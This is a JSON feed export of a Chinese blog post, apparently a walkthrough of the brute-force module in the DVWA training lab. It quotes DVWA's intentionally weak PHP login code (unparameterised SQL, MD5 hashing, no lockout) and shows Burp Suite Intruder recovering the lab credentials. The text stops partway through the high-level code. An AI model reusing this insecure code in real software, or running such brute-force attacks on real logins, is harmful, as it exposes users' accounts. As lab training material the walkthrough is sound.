{
    "version": "https://jsonfeed.org/version/1",
    "title": "日拱一卒 功不唐捐",
    "subtitle": "",
    "icon": "https://ph0ven1x.github.io/assets/favicon.ico",
    "description": "热爱生活，热爱安全",
    "home_page_url": "https://ph0ven1x.github.io",
    "items": [
        {
            "id": "https://ph0ven1x.github.io/2024/05/16/DVWA%E5%85%A8%E7%BA%A7%E5%88%AB%E9%80%9A%E5%85%B3-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/",
            "url": "https://ph0ven1x.github.io/2024/05/16/DVWA%E5%85%A8%E7%BA%A7%E5%88%AB%E9%80%9A%E5%85%B3-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/",
            "title": "DVWA全级别通关-暴力破解",
            "date_published": "2024-05-16T07:06:49.000Z",
            "content_html": "<h2 id=\"brute-force暴力破解\"><a class=\"anchor\" href=\"#brute-force暴力破解\">#</a> Brute Force（暴力破解）</h2>\n<h3 id=\"low级\"><a class=\"anchor\" href=\"#low级\">#</a> low 级</h3>\n<p><img loading=\"lazy\" data-src=\"DVWA%E5%85%A8%E7%BA%A7%E5%88%AB%E9%80%9A%E5%85%B3-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20240515144908154.png\" alt=\"\" /></p>\n<p>先对代码进行审计，没有任何防爆机制</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'Login'</span> <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token comment\">// Get username</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'username'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token comment\">// Get password</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token variable\">$pass</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'password'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token variable\">$pass</span> <span class=\"token operator\">=</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$pass</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token comment\">// Check the database</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token variable\">$query</span>  <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT * FROM `users` WHERE user = '<span class=\"token interpolation\"><span class=\"token variable\">$user</span></span>' AND password = '<span class=\"token interpolation\"><span class=\"token variable\">$pass</span></span>';\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$query</span> <span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'&lt;pre>'</span> <span class=\"token operator\">.</span> <span class=\"token function\">mysql_error</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'&lt;/pre>'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$result</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">mysql_num_rows</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$result</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token comment\">// Get users details</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token variable\">$avatar</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_result</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$result</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"avatar\"</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token comment\">// Login successful</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;p>Welcome to the password protected area <span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$user</span><span class=\"token punctuation\">&#125;</span></span>&lt;/p>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;img src=\\\"<span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$avatar</span><span class=\"token punctuation\">&#125;</span></span>\\\" />\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token comment\">// Login failed</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;pre>&lt;br />Username and/or password incorrect.&lt;/pre>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token function\">mysql_close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>随便输入用户名和密码，然后用 BurpSuite 抓包，点击登录，抓到包以后发送到 Intruder 模块，攻击类型选择 Cluster Bomb，将用户名和密码设置为变量。（这里用 Sniper 就行，选取密码这一个变量进行爆破，因为已经知道用户名 admin）</p>\n<p><img loading=\"lazy\" data-src=\"DVWA%E5%85%A8%E7%BA%A7%E5%88%AB%E9%80%9A%E5%85%B3-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20240515151306315.png\" alt=\"image-20240515151306315\" /></p>\n<blockquote>\n<p>[!IMPORTANT]</p>\n<p>攻击类型：</p>\n<ul>\n<li>\n<p>Sniper (狙击手)：可以设置任意多的变量，但只能设置一个 payload。所有变量都是使用一个 payload，当对一个变量进行爆破时，其他变量值保持不变，然后根据变量的顺序依次爆破。</p>\n<p>对于用户名和密码的爆破，常用于已经知道了用户名或密码中的一个，去爆破另一个。</p>\n</li>\n<li>\n<p>Batter ram (攻城锤)：可以设置任意多的变量，但只能设置一个 payload。所有变量都是使用一个 payload，同时爆破变量。</p>\n<p>与 Sniper 类似，唯一的区别是，不是根据变量的顺序进行依次爆破，而是同时爆破所有变量。</p>\n<p>对于用户名和密码的爆破不适用，使用这种攻击类型，每次爆破用户名和密码都是一样的。</p>\n</li>\n<li>\n<p>Pitchfork (干草叉)：可以设置任意多的变量，每个变量都可以设置不同的 payload。爆破时，所有变量同时进行爆破，也就是说，变量每次读取的是对应 payload 中同一行的字段。例如，在爆破用户名和密码时，设置了两个 payload，第一行的用户名只能匹配第一行的密码，第二行的用户名只能匹配第二行的密码，以此类推... 这种攻击类型对于爆破用户名和密码是不完全的，仅仅只是把同一行的用户名和密码进行匹配，没有交错匹配。</p>\n</li>\n<li>\n<p>Cluster Bomb (集束炸弹)：可以设置任意多的变量，每个变量都可以设置不同的 payload。爆破时，会尝试所有组合。（笛卡尔积）</p>\n<p>以爆破用户名和密码为例，用户名变量为 payload1，密码变量为 payload2，用户名变量会读取 payload1 中的第一行时，密码变量读取 payload2 中的第一行；用户名变量会读取 payload1 中的第二行时，密码变量仍读取 payload2 中的第一行... 依次类推，直到 payload1 中的字段被读取完毕，密码才开始读取 payload2 中的第二行... 依次类推，直到所有用户名和密码的组合都尝试过一边。这可以说是 Pitchfork 的升级版，用户名和密码会交错匹配，尝试所有组合，但耗时间。</p>\n</li>\n</ul>\n</blockquote>\n<p>然后进行 payload 设置，分别对 payload1 和 payload2 设置字典，点击 start attack 开始爆破</p>\n<p><img loading=\"lazy\" data-src=\"DVWA%E5%85%A8%E7%BA%A7%E5%88%AB%E9%80%9A%E5%85%B3-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20240515160713818.png\" alt=\"image-20240515160713818\" /></p>\n<p>看返回的长度可以确认真实的用户名和密码</p>\n<p><img loading=\"lazy\" data-src=\"DVWA%E5%85%A8%E7%BA%A7%E5%88%AB%E9%80%9A%E5%85%B3-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20240515165105834.png\" alt=\"image-20240515165105834\" /></p>\n<p>或者选择筛选，我们从源码中可以看见登录成功时返回字段 <code>Username and/or password incorrect.</code></p>\n<p><img loading=\"lazy\" data-src=\"DVWA%E5%85%A8%E7%BA%A7%E5%88%AB%E9%80%9A%E5%85%B3-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20240516140040131.png\" alt=\"image-20240516140040131\" /></p>\n<p><img loading=\"lazy\" data-src=\"DVWA%E5%85%A8%E7%BA%A7%E5%88%AB%E9%80%9A%E5%85%B3-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20240516140057072.png\" alt=\"image-20240516140057072\" /></p>\n<p>用户名：admin 密码：password （用户名不区分大小写）到此 low 级结束。</p>\n<p><img loading=\"lazy\" data-src=\"DVWA%E5%85%A8%E7%BA%A7%E5%88%AB%E9%80%9A%E5%85%B3-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20240515172535555.png\" alt=\"image-20240515172535555\" /></p>\n<h3 id=\"medium级\"><a class=\"anchor\" href=\"#medium级\">#</a> medium 级</h3>\n<p>先进行代码审计</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'Login'</span> <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token comment\">// Sanitise username input</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'username'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$user</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">trigger_error</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">E_USER_ERROR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token string double-quoted-string\">\"\"</span> <span class=\"token punctuation\">:</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token comment\">// Sanitise password input</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token variable\">$pass</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'password'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token variable\">$pass</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$pass</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">trigger_error</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">E_USER_ERROR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token string double-quoted-string\">\"\"</span> <span class=\"token punctuation\">:</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token variable\">$pass</span> <span class=\"token operator\">=</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$pass</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token comment\">// Check the database</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token variable\">$query</span>  <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT * FROM `users` WHERE user = '<span class=\"token interpolation\"><span class=\"token variable\">$user</span></span>' AND password = '<span class=\"token interpolation\"><span class=\"token variable\">$pass</span></span>';\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$query</span> <span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'&lt;pre>'</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_error</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___mysqli_res</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_connect_error</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token variable\">$___mysqli_res</span> <span class=\"token punctuation\">:</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'&lt;/pre>'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$result</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">mysqli_num_rows</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$result</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token comment\">// Get users details</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token variable\">$row</span>    <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_fetch_assoc</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$result</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token variable\">$avatar</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"avatar\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token comment\">// Login successful</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;p>Welcome to the password protected area <span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$user</span><span class=\"token punctuation\">&#125;</span></span>&lt;/p>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;img src=\\\"<span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$avatar</span><span class=\"token punctuation\">&#125;</span></span>\\\" />\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token comment\">// Login failed</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;pre>&lt;br />Username and/or password incorrect.&lt;/pre>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_null</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___mysqli_res</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_close</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token constant boolean\">false</span> <span class=\"token punctuation\">:</span> <span class=\"token variable\">$___mysqli_res</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>相比 low，medium 增加了 <code>mysqli_real_escape_string()</code>  函数，这个函数用于转义字符串中的特殊字符，以防止与 MySQL 数据库交互时发生 SQL 注入攻击。这个函数接收两个参数，第一个参数是数据库的连接对象，第二个参数是需要转义的字符串。还在登录失败后增加了 sleep (2) 睡眠 2 秒，增加了暴力破解的时间。因此，对暴力破解还是没有实质性的防治措施，用 low 级的方法就能可以了，就不再演示。</p>\n<h3 id=\"high级\"><a class=\"anchor\" href=\"#high级\">#</a> high 级</h3>\n<p>先进行代码审计</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'Login'</span> <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token comment\">// Check Anti-CSRF token</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token function\">checkToken</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'user_token'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'session_token'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'index.php'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token comment\">// Sanitise username input</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'username'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token function\">stripslashes</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$user</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$user</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">trigger_error</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">E_USER_ERROR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token string double-quoted-string\">\"\"</span> <span class=\"token punctuation\">:</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token comment\">// Sanitise password input</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token variable\">$pass</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'password'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token variable\">$pass</span> <span class=\"token operator\">=</span> <span class=\"token function\">stripslashes</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$pass</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token variable\">$pass</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span 